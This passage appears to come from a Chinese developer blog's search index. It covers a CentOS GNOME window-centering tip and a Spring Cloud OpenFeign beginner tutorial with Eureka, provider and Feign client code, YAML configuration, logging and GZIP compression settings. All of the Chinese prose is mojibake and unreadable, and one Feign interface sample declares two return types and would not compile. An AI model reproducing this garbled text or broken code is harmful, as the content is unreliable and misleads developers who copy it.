æ³•è®¾ç½®çª—å£ä½ç½®é»˜è®¤ä¸ºå±…ä¸­ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•ä½¿ç”¨ dconf-editor æ¥è®¾ç½®ã€‚ 1234567# å®‰è£…dconf-editor# yum install dconf-editor# è¿è¡Œdconf-editorï¼ˆä½¿ç”¨æ™®é€šç”¨æˆ·èº«ä»½ï¼‰$ dconf-editor# æ‰“å¼€/org/gnome/mutteré€‰é¡¹å¡ï¼Œæ‰¾åˆ°"center-new-windows"ï¼Œç„¶åç‚¹å‡»å¯ç”¨æŒ‰é’®å³å¯ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰ï¼Œç„¶åé€šè¿‡æŒ‰ä¸‹ Alt + F2 å¿«æ·é”®ï¼Œç„¶åè¾“å…¥ r é‡å¯ç•Œé¢ å‚è€ƒåšå®¢ CentOS7 å®Œå…¨è£…é€¼æŒ‡å— å¦‚ä½•ä½¿ç”¨ GNOME Shell æ‰©å±• CentOS7 æ‰“é€ åˆé€‚çš„ç§‘ç ”ç¯å¢ƒ How to Install GNOME Shell Extensions Using GUI &amp; Command Line Interface var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"OpenFeign å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡",url:"/posts/906bddbc.html",text:'Spring Cloud OpenFeign ä»‹ç»Feign æ¦‚è¿°åœ¨ä½¿ç”¨ Spring Cloud å¼€å‘å¾®æœåŠ¡åº”ç”¨æ—¶ï¼Œå„ä¸ªæœåŠ¡æä¾›è€…éƒ½æ˜¯ä»¥ HTTP æ¥å£çš„å½¢å¼å¯¹å¤–æä¾›æœåŠ¡ï¼Œå› æ­¤åœ¨æœåŠ¡æ¶ˆè´¹è€…è°ƒç”¨æœåŠ¡æä¾›è€…æ—¶ï¼Œåº•å±‚é€šè¿‡ HTTP Client çš„æ–¹å¼è®¿é—®ã€‚æ­¤æ—¶å¯ä»¥ä½¿ç”¨ JDK åŸç”Ÿçš„ URLConnectionã€Apache çš„ HTTP Clientã€Netty çš„å¼‚æ­¥ HTTP Client æˆ–è€… Spring çš„ RestTemplate å»å®ç°æœåŠ¡é—´çš„è°ƒç”¨ã€‚ä½†æ˜¯æœ€æ–¹ä¾¿ã€æœ€ä¼˜é›…çš„æ–¹å¼æ˜¯é€šè¿‡ Feign è¿›è¡ŒæœåŠ¡é—´çš„è°ƒç”¨ã€‚Feign æ˜¯ç”± Netflix å¼€å‘çš„ä¸€ä¸ªå£°æ˜å¼çš„ Web Service å®¢æˆ·ç«¯ï¼Œå®ƒçš„å‡ºç°ä½¿å¼€å‘ Web Service å®¢æˆ·ç«¯å˜å¾—å¾ˆç®€å•ï¼›Feign åŒæ—¶ä¹Ÿæ˜¯ä¸€æ¬¾å£°æ˜å¼ã€æ¨¡æ¿åŒ–çš„ HTTP å®¢æˆ·ç«¯ã€‚æ›´å¤šä»‹ç»å¯å‚è€ƒï¼šFeign é¡¹ç›®ã€Spring Cloud Feign å®˜æ–¹ä¸­æ–‡æ•™ç¨‹ Spring Cloud OpenFeign æ¦‚è¿°Spring Cloud OpenFeign å¯¹ Feign è¿›è¡Œäº†äºŒæ¬¡å°è£…ï¼Œä½¿å¾—åœ¨ Spring Cloud ä¸­ä½¿ç”¨ Feign çš„æ—¶å€™ï¼Œå¯ä»¥åšåˆ°ä½¿ç”¨ HTTP è¯·æ±‚è®¿é—®è¿œç¨‹æœåŠ¡ï¼Œå°±åƒè°ƒç”¨æœ¬åœ°æ–¹æ³•ä¸€æ ·çš„ï¼Œå¼€å‘è€…å®Œå…¨æ„ŸçŸ¥ä¸åˆ°è¿™æ˜¯åœ¨è°ƒç”¨è¿œç¨‹è®¿é—®ï¼Œæ›´æ„ŸçŸ¥ä¸åˆ°åœ¨è®¿é—® HTTP è¯·æ±‚ã€‚Spring Cloud OpenFeign å¢å¼ºäº† Feign çš„åŠŸèƒ½ï¼Œä½¿ Feign æœ‰é™æ”¯æŒ Spring MVC çš„æ³¨è§£ï¼Œå¦‚ @RequestMapping ç­‰ã€‚OpenFeign çš„ @FeignClient æ³¨è§£å¯ä»¥è§£æ Spring MVC çš„ @RequestMapping æ³¨è§£ä¸‹çš„æ¥å£ï¼Œå¹¶é€šè¿‡åŠ¨æ€ä»£ç†çš„æ–¹å¼äº§ç”Ÿå®ç°ç±»ï¼Œåœ¨å®ç°ç±»ä¸­åšè´Ÿè½½å‡è¡¡å¹¶è°ƒç”¨å…¶ä»–æœåŠ¡ï¼Œé»˜è®¤é›†æˆäº† Ribbon ä¸ Hystrixã€‚æ›´å¤šä»‹ç»å¯å‚è€ƒï¼šSpring Cloud OpenFeign é¡¹ç›® Spring Cloud OpenFeign çš„ç‰¹æ€§ Feign æœ€æ–°ç‰¹æ€§ä¸€è§ˆå›¾ æ”¯æŒ Hystrix å’Œ å®ƒçš„ Fallback æ”¯æŒ HTTP è¯·æ±‚çš„å“åº”å’Œå‹ç¼© æ”¯æŒ Ribbon çš„è´Ÿè½½å‡è¡¡å®¢æˆ·ç«¯ æ”¯æŒå¯æ’æ‹”çš„ HTTP ç¼–ç å™¨å’Œè§£ç å™¨ å¯æ’æ‹”çš„æ³¨è§£æ”¯æŒï¼ŒåŒ…æ‹¬ Feign æ³¨è§£ å’Œ JAX-RS æ³¨è§£ Feign ä¸ Spring Cloud OpenFeign çš„é€‰æ‹©Spring Cloud F åŠ F ç‰ˆæœ¬ä»¥ä¸Šä¸ Spring Boot 2.0 ä»¥ä¸Šä¸€èˆ¬ä½¿ç”¨ OpenFeignï¼Œå¦‚æœä»æ¡†æ¶ç»“æ„ä¸Šçœ‹ï¼ŒOpenFeign å°±æ˜¯ 2019 å¹´ Feign åœæ›´åå‡ºç°çš„ç‰ˆæœ¬ï¼Œä¹Ÿå¯ä»¥è¯´å¤§å¤šæ•°æ–°é¡¹ç›®éƒ½ç”¨ OpenFeignï¼Œè€Œ 2018 å¹´ä»¥å‰çš„é¡¹ç›®ä¸€èˆ¬ä½¿ç”¨ Feignï¼Œå¤§æ¦‚å¯ä»¥è¿™æ ·ç²—ç‡åœ°åˆ’åˆ†ã€‚ Spring Cloud OpenFeign å…¥é—¨æ¡ˆä¾‹1. ç‰ˆæœ¬è¯´æ˜åœ¨ä¸‹é¢çš„çš„æ•™ç¨‹ä¸­ï¼Œä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Finchley.RELEASEï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.0.3ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ç”±äºç¯‡å¹…æœ‰é™ï¼Œä¸‹æ–‡ä¸­è‹¥æ²¡ç‰¹æ®Šè¯´æ˜ï¼ŒFeign ä¸€èˆ¬æŒ‡çš„å°±æ˜¯ Spring Cloud OpenFeignã€‚ 2. åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--æ³¨æ„ï¼šè¿™é‡Œéœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å„ç§ä¾èµ–é—®é¢˜ --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. åˆ›å»º Eureka Server å·¥ç¨‹åˆ›å»º Eureka Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Eureka Server çš„å¯åŠ¨ä¸»ç±»ï¼Œè¿™é‡Œæ·»åŠ ç›¸åº”æ³¨è§£ï¼Œä½œä¸ºç¨‹åºçš„å…¥å£ï¼š 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} æ·»åŠ  Eureka Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ 1234567891011server: port: 8090eureka: instance: hostname: 127.0.0.1 client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. åˆ›å»º Provider æºæœåŠ¡å·¥ç¨‹ä¸ºäº†æµ‹è¯• Feign çš„ Web æœåŠ¡å®¢æˆ·ç«¯çš„åŠŸèƒ½ï¼Œå¿…é¡»è¦æœ‰ä¸€ä¸ªæºæœåŠ¡ï¼ˆæœåŠ¡æä¾›è€…ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥é€‰æ‹©å¯åŠ¨å¤šä¸ªå®ä¾‹ï¼Œåœ¨æ¯ä¸ªå®ä¾‹ä¸­éœ€è¦æœ‰ä¸€ä¸ªæ ‡è¯†ï¼ˆä¾‹å¦‚ç«¯å£ï¼‰æ¥è¯†åˆ«æ¯æ¬¡çš„è°ƒç”¨æ˜¯åˆ°äº†ä¸åŒçš„æœåŠ¡å®ä¾‹ä¸Šã€‚è¿™é‡Œå¯ä»¥ä½¿ç”¨ä¸€ä»½ä»£ç ï¼Œé‡‡å–æ”¹å˜ç«¯å£å·çš„æ–¹å¼å¯åŠ¨å¤šæ¬¡ï¼Œå°±èƒ½å¯åŠ¨å¤šä¸ªç›¸åŒçš„æœåŠ¡å®ä¾‹ã€‚åˆ›å»º Provider çš„ Maven å·¥ç¨‹åï¼Œç”±äºéœ€è¦å°†æœåŠ¡æ³¨å†Œåˆ° Eureka Serverï¼Œå·¥ç¨‹ä¸‹çš„ pom.xml æ–‡ä»¶éœ€è¦å¼•å…¥ spring-cloud-starter-netflix-eureka-client 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Provider çš„å¯åŠ¨ä¸»ç±»ï¼Œæ·»åŠ æ³¨è§£ @EnableDiscoveryClientï¼Œå°†æœåŠ¡æ³¨å†Œåˆ° Eureka Serverï¼š 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args){ SpringApplication.run(ProviderApplication.class, args); }} åœ¨ application.yml æ–‡ä»¶ä¸­æŒ‡å®šæœåŠ¡åç§°ï¼ˆproviderï¼‰ã€æ³¨å†Œä¸­å¿ƒåœ°å€ä¸ç«¯å£å·ï¼Œåé¢å¯åŠ¨å¤šå®ä¾‹åªéœ€è¦ä¿®æ”¹è¿™é‡Œçš„ç«¯å£å·å³å¯ï¼š 12345678910111213server: port: 9090spring: application: name: providereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true åˆ›å»ºç”¨äºæµ‹è¯•çš„ Controller ç±»ï¼š 12345678@RestControllerpublic class ProviderController { @GetMapping("/provider/add") public String add(Integer a, Integer b, HttpServletRequest request) { return "From Port: " + request.getServerPort() + ", Result: " + (a + b); }} 5. åˆ›å»º Feign Client å·¥ç¨‹åˆ›å»º Feign Client çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-starter-openfeignï¼›è‹¥æ˜¯ä½¿ç”¨æ—§ç‰ˆçš„ Spring Cloudï¼Œåˆ™æ”¹ä¸ºå¼•å…¥ spring-cloud-starter-feignã€‚å¦å¤–ç”±äºéœ€è¦ä» Eureka Server è·å–æœåŠ¡åˆ—è¡¨ï¼Œå³ä½œä¸º Eureka å®¢æˆ·ç«¯ï¼Œè¿˜éœ€è¦å¼•å…¥ spring-cloud-starter-netflix-eureka-clientã€‚ 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»ºå¯åŠ¨ä¸»ç±»ï¼Œæ·»åŠ æ³¨è§£ @EnableFeignClientsã€@EnableDiscoveryClient 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class FeignApplication { public static void main(String[] args){ SpringApplication.run(FeignApplication.class, args); }} åˆ›å»ºæœåŠ¡æ¥å£ç±»ï¼Œç”¨äºè°ƒç”¨ Provider æºæœåŠ¡ï¼š 123456@FeignClient(value = "PROVIDER")public interface ProviderClientService { @GetMapping("/provider/add") String add(@RequestParam("a") Integer a, @RequestParam("b") Integer b);} åˆ›å»ºç”¨äºæµ‹è¯•çš„ Controller ç±»ï¼Œå› ä¸ºéœ€è¦åˆ›å»ºä¸€ä¸ª API æ¥ä¾›ç¬¬ä¸‰æ–¹è°ƒç”¨ Provider æºæœåŠ¡çš„é‚£ä¸ªè‡ªå®šä¹‰ APIï¼š 1234567891011@RestControllerpublic class CalculateController { @Autowired private ProviderClientService clientService; @GetMapping("/add") public String add(Integer a, Integer b){ return clientService.add(a, b); }} åœ¨ application.yml æ–‡ä»¶ä¸­é…ç½®ç«¯å£å·ã€æ³¨å†Œä¸­å¿ƒåœ°å€ï¼š 12345678910111213server: port: 8080spring: application: name: feign-clienteureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 6. æµ‹è¯• å¯åŠ¨ Eureka Server åï¼Œæ›´æ”¹ Provider æºæœåŠ¡çš„ç«¯å£å·ä¸º 9091 ä¸ 9092 ååˆ†åˆ«å¯åŠ¨ï¼Œæµè§ˆå™¨è®¿é—® http://127.0.0.1:8090ï¼ŒæŸ¥çœ‹ Eureka Server çš„ç•Œé¢æ˜¯å¦æ­£å¸¸æ˜¾ç¤ºå¤šä¸ª Provider æºæœåŠ¡ å¯åŠ¨ Feign Client åº”ç”¨ï¼Œæµè§ˆå™¨è®¿é—® http://localhost:8080/add?a=3&amp;b=9ï¼Œè‹¥æ­£å¸¸è¿”å›è®¡ç®—ç»“æœï¼Œè¯´æ˜æ•´ä¸ªé¡¹ç›®è¿è¡ŒæˆåŠŸ æç¤ºï¼šç”±äº Feign é»˜è®¤é›†æˆäº† Ribbonï¼ˆå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡ï¼‰ï¼Œå½“å­˜åœ¨å¤šä¸ªæœåŠ¡æä¾›è€…æ—¶ï¼ŒFeign é»˜è®¤ä¼šä½¿ç”¨è½®è¯¢çš„æ–¹å¼è®¿é—®æºæœåŠ¡ï¼Œæ­¤å¤– Feign å¯¹æœåŠ¡å®ä¾‹èŠ‚ç‚¹çš„å¢å‡ä¹Ÿèƒ½åŠ¨æ€æ„ŸçŸ¥ Spring Cloud OpenFeign åŸºç¡€åŠŸèƒ½Feign çš„å·¥ä½œåŸç† å¼€å‘å¾®æœåŠ¡åº”ç”¨æ—¶ï¼Œåœ¨ä¸»ç¨‹åºå…¥å£æ·»åŠ  @EnableFeignClients æ³¨è§£å¼€å¯å¯¹ Feign Client æ‰«æåŠ è½½å¤„ç†ã€‚æ ¹æ® Feign Client çš„å¼€å‘è§„èŒƒï¼Œéœ€è¦å®šä¹‰æ¥å£å¹¶æ·»åŠ  @FeignClient æ³¨è§£ã€‚ å½“ç¨‹åºå¯åŠ¨æ—¶ï¼Œä¼šè¿›è¡ŒåŒ…æ‰«æï¼Œæ‰«ææ‰€æœ‰æ ‡æ³¨äº† @FeignClient æ³¨è§£çš„ç±»ï¼Œå¹¶å°†è¿™äº›ä¿¡æ¯æ³¨å…¥ Spring IOC å®¹å™¨ä¸­ã€‚ å½“å®šä¹‰çš„ Feign æ¥å£ä¸­çš„æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œé€šè¿‡ JDK çš„ä»£ç†æ–¹å¼ï¼Œæ¥ç”Ÿæˆå…·ä½“çš„ RequestTemplateã€‚ç”Ÿæˆä»£ç†æ—¶ï¼ŒFeign ä¼šä¸ºæ¯ä¸ªæ¥å£æ–¹æ³•åˆ›å»ºä¸€ä¸ª RestTemplate å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å°è£…äº† HTTP è¯·æ±‚éœ€è¦çš„å…¨éƒ¨ä¿¡æ¯ï¼Œå¦‚è¯·æ±‚å‚æ•°åã€è¯·æ±‚æ–¹æ³•ç­‰ä¿¡æ¯éƒ½åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ç¡®å®šã€‚ ç„¶åç”± RestTemplate ç”Ÿæˆ Requestï¼Œæ¥ç€æŠŠ Request äº¤ç»™ Client å»å¤„ç†ï¼Œè¿™é‡ŒæŒ‡çš„ Client å¯ä»¥æ˜¯ JDK åŸç”Ÿçš„ URLConnectionã€Apache çš„ Http Clientã€ä¹Ÿå¯ä»¥æ˜¯ Okhttpã€‚æœ€å Client è¢«å°è£…åˆ° LoadBalanceClient ç±»ä¸­ï¼Œè¿™ä¸ªç±»ç»“åˆ Ribbon å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡å‘èµ·æœåŠ¡é—´çš„è°ƒç”¨ã€‚ @FeignClient æ³¨è§£çš„å±æ€§ nameï¼šæŒ‡å®š FeignClient çš„åç§°ï¼Œå¦‚æœé¡¹ç›®ä½¿ç”¨äº† Ribbonï¼Œé‚£ä¹ˆ name å±æ€§ä¼šä½œä¸ºå¾®æœåŠ¡çš„åç§°ï¼Œç”¨äºæœåŠ¡å‘ç° urlï¼šä¸€èˆ¬ç”¨äºè°ƒè¯•ï¼Œå¯ä»¥æ‰‹åŠ¨æŒ‡å®š @FeignClient è°ƒç”¨çš„æœåŠ¡åœ°å€ decode404ï¼šå½“å‘ç”Ÿ 404 é”™è¯¯æ—¶ï¼Œå¦‚æœè¯¥å­—æ®µå€¼ä¸º trueï¼Œä¼šè°ƒç”¨ decoder è¿›è¡Œè§£ç ï¼Œå¦åˆ™æŠ›å‡º FeignException configurationï¼šFeign é…ç½®ç±»ï¼Œå¯ä»¥è‡ªå®šä¹‰ Feign çš„ Encoderã€Decoderã€LogLevelã€Contract fallbackï¼šå®šä¹‰å®¹é”™çš„å¤„ç†ç±»ï¼Œå½“è°ƒç”¨è¿œç¨‹æ¥å£å¤±è´¥æˆ–è¶…æ—¶ï¼Œä¼šè°ƒç”¨å¯¹åº”æ¥å£çš„å®¹é”™é€»è¾‘ï¼Œfallback æŒ‡å®šçš„ç±»å¿…é¡»å®ç° @FeignClient æ ‡è®°çš„æ¥å£ fallbackFactoryï¼šå·¥å‚ç±»ï¼Œç”¨äºç”Ÿæˆ fallback ç±»ç¤ºä¾‹ï¼Œé€šè¿‡è¿™ä¸ªå±æ€§å¯ä»¥å®ç°æ¯ä¸ªæ¥å£é€šç”¨çš„å®¹é”™é€»è¾‘ï¼Œå‡å°‘é‡å¤çš„ä»£ç  pathï¼šå®šä¹‰å½“å‰ FeignClient çš„ç»Ÿä¸€å‰ç¼€ Feign å±æ€§æ–‡ä»¶é…ç½®è‹¥å¸Œæœ›å¯¹å•ä¸ªæŒ‡å®šç‰¹å®šåç§°çš„ Feign è¿›è¡Œé…ç½®ï¼Œæ­¤æ—¶å¯ä»¥å°† @FeignClient æ³¨è§£çš„å±æ€§é…ç½®å†™åœ¨ application.yml æˆ–è€… application.propertiesï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 12345678910111213141516feign: client: config: feignName: # éœ€è¦é…ç½®çš„FeignName connectTimeout: 5000 # è¿æ¥è¶…æ—¶æ—¶é—´ readTimeout: 5000 # è¯»è¶…æ—¶æ—¶é—´è®¾ç½® loggerLevel: full # é…ç½®Feignçš„æ—¥å¿—çº§åˆ« errorDecoder: com.example.SimpleErrorDecoder # Feignçš„é”™è¯¯è§£ç å™¨ retryer: com.example.SimpleRetryer # é…ç½®é‡è¯• requestInterceptors: # é…ç½®æ‹¦æˆªå™¨ - com.example.FooRequestInterceptor - com.example.BarRequestInterceptor decode404: false encoder: com.example.SimpleEncoder # Feignçš„ç¼–ç å™¨ decoder: com.example.SimpleDecoder # Feignçš„è§£ç å™¨ contract: com.example.SimpleContract # Feignçš„Contracté…ç½® ä½œç”¨äºæ‰€æœ‰ Feign çš„é…ç½®æ–¹å¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨ application.yml æˆ–è€… application.properties æ¥é…ç½®æ‰€æœ‰ Feignï¼Œå¯ä»¥ä½¿ç”¨ä¸‹è¿°é…ç½®ï¼š 1234567feign: client: config: default: readTimeout: 5000 loggerLevel: full connectTimeout: 5000 @EnableFeignClients æ³¨è§£ä¸Šæœ‰ä¸ª defaultConfiguration å±æ€§ï¼Œå¯ä»¥å°†é»˜è®¤é…ç½®ç»Ÿä¸€å†™åœ¨ä¸€ä¸ªé…ç½®ç±»ä¸­ï¼Œç„¶ååœ¨ä¸»ç¨‹åºå…¥å£ç”¨ defaultConfiguration æ¥åº”ç”¨é…ç½®ç±»ï¼Œè¯¥é…ç½®æ–¹å¼åŒæ ·å¯ä»¥ä½œç”¨äºæ‰€æœ‰ Feign 123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClients(defaultConfiguration = DefaultFeignConfiguration.class)public class FeignApplication { public static void main(String[] args){ SpringApplication.run(FeignApplication.class, args); }} ç‰¹åˆ«æ³¨æ„ï¼šå¦‚æœé€šè¿‡ Java ä»£ç çš„æ–¹å¼é…ç½®è¿‡ Feignï¼Œç„¶ååˆé€šè¿‡ application.yml æˆ–è€… application.properties å±æ€§æ–‡ä»¶çš„æ–¹å¼é…ç½® Feignï¼Œé»˜è®¤æƒ…å†µä¸‹å±æ€§æ–‡ä»¶ä¸­ Feign çš„é…ç½®ä¼šè¦†ç›– Java ä»£ç çš„é…ç½®ã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡ä½¿ç”¨å‚æ•° feign.client.default-to-properties=false æ¥æ”¹å˜ Feign é…ç½®ç”Ÿæ•ˆçš„ä¼˜å…ˆçº§ã€‚ Feign Client å¼€å¯æ—¥å¿—Feign ä¸ºæ¯ä¸€ä¸ª FeignClient éƒ½æä¾›äº†ä¸€ä¸ª feign.Logger å®ä¾‹ï¼Œå¯ä»¥åœ¨é…ç½®ä¸­å¼€å¯æ—¥å¿—ï¼Œå¼€å¯æ–¹å¼æ¯”è¾ƒç®€å•ï¼Œåˆ†ä¸ºä¸¤æ­¥ã€‚ ç¬¬ä¸€æ­¥ï¼šåœ¨ application.yml ä¸­é…ç½®æ—¥å¿—è¾“å‡ºï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè®°å½•å™¨çš„åç§°æ˜¯ç”¨äºåˆ›å»º Feign å®¢æˆ·ç«¯çš„æ¥å£çš„å®Œæ•´ç±»åï¼ŒFeign æ—¥å¿—è®°å½•ä»…å“åº” DEBUG çº§åˆ« 123logging: level: com.springcloud.study.service.ProviderClientService: debug ç¬¬äºŒæ­¥ï¼šé€šè¿‡ Java ä»£ç çš„æ–¹å¼é…ç½®æ—¥å¿— Beanï¼Œå¯ä»¥é…ç½®åœ¨ä¸»ç¨‹åºå…¥å£ç±»æˆ–è€…å¸¦æœ‰ @Configuration æ³¨è§£çš„ç±»ï¼Œä½œç”¨æ˜¯é€šè¿‡é…ç½®çš„ Logger.Level å¯¹è±¡å‘Šè¯‰ Feign è®°å½•å“ªäº›æ—¥å¿—å†…å®¹ 1234567891011121314151617@Configurationpublic class FeignServiceConfig { /** * Logger.Level çš„å…·ä½“çº§åˆ«å¦‚ä¸‹ï¼š * NONEï¼šä¸è®°å½•ä»»ä½•ä¿¡æ¯ * BASICï¼šä»…è®°å½•è¯·æ±‚æ–¹æ³•ã€URLä»¥åŠå“åº”çŠ¶æ€ç å’Œæ‰§è¡Œæ—¶é—´ * HEADERSï¼šé™¤äº†è®°å½• BASICçº§åˆ«çš„ä¿¡æ¯å¤–ï¼Œè¿˜ä¼šè®°å½•è¯·æ±‚å’Œå“åº”çš„å¤´ä¿¡æ¯ * FULLï¼šè®°å½•æ‰€æœ‰è¯·æ±‚ä¸å“åº”çš„æ˜ç»†ï¼ŒåŒ…æ‹¬å¤´ä¿¡æ¯ã€è¯·æ±‚ä½“ã€å…ƒæ•°æ® * * @return */ @Bean Logger.Level feignLoggerLevel() { return Logger.Level.FULL; }} Feign å¼€å¯ GZIP å‹ç¼©Feign æ”¯æŒå¯¹è¯·æ±‚å’Œå“åº”è¿›è¡Œ GZIP å‹ç¼©ï¼Œä»¥æ­¤æé«˜é€šä¿¡æ•ˆç‡ï¼Œä¸‹è¿°å†…å®¹é…ç½®äº† Consumer é€šè¿‡ Feign åˆ° Provider çš„è¯·æ±‚ä¸ç›¸åº”çš„ Gzip å‹ç¼©ï¼ˆåœ¨æœåŠ¡æ¶ˆè´¹è€…ç«¯é…ç½®ï¼‰ 12345678feign: compression: request: enabled: true mime-types: text/xml,application/xml,application/json # é…ç½®å‹ç¼©æ”¯æŒçš„MIME TYPE min-request-size: 2048 # é…ç½®å‹ç¼©æ•°æ®å¤§å°çš„ä¸‹é™ response: enabled: true # é…ç½®å“åº”GZIPå‹ç¼© ç”±äºå¼€å¯ GZIP å‹ç¼©åï¼ŒFeign ä¹‹é—´çš„è°ƒç”¨æ˜¯é€šè¿‡äºŒè¿›åˆ¶åè®®è¿›è¡Œä¼ è¾“çš„ï¼Œè‹¥æœåŠ¡ä¹‹é—´çš„è°ƒç”¨ç»“æœå‡ºç°äº†ä¹±ç ï¼Œæ­¤æ—¶å¯ä»¥å°†è¿”å›å€¼çš„ç±»å‹ä¿®æ”¹ä¸º ResponseEntity&lt;byte[]&gt;ï¼Œå…¶ä¸­çš„ Controller ç±» ä¸è¢« @FeignClient æ³¨è§£æ ‡æ³¨çš„æ¥å£éƒ½è¦ä¿®æ”¹ 123456@FeignClient(value = "PROVIDER")public interface ProviderClientService { @GetMapping("/provider/say") ResponseEntity&lt;byte[]&gt; String say(@RequestParam("msg") String msg);} 1234567891011@RestControllerpublic class CalculateController { @Autowired private ProviderClientService clientService; @GetMapping("/say") public ResponseEntity&lt;byte[]&gt; say(String msg){ return clientService.say(msg); }} éªŒè¯å‹ç¼©æ•ˆæœï¼Œé¦–å…ˆå¼€å¯ Feign çš„æ—¥å¿—è¾“å‡ºï¼Œç„¶ååˆ†åˆ«å¯ç”¨ Feign å‹ç¼©ä¸å…³é—­ Feign å‹ç¼©ï¼Œè§‚å¯Ÿå‰åè¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯ï¼š å…³é—­ GZIP å‹ç¼©çš„ Request 12---&gt; GET http://PROVIDER/provider/say?msg=hello HTTP/1.1---&gt; END HTTP (0-byte body) å¼€å¯ GZIP å‹ç¼©çš„ Requestï¼Œå¢åŠ äº† Accept-Encoding: gzipï¼Œè¯æ˜ Request å¼€å¯äº† GZIP å‹ç¼© 1234---&gt; GET http://PROVIDER/provider/say?msg=hello HTTP/1.1Accept-Encoding: gzipAccept-Encoding: deflate---&gt; END 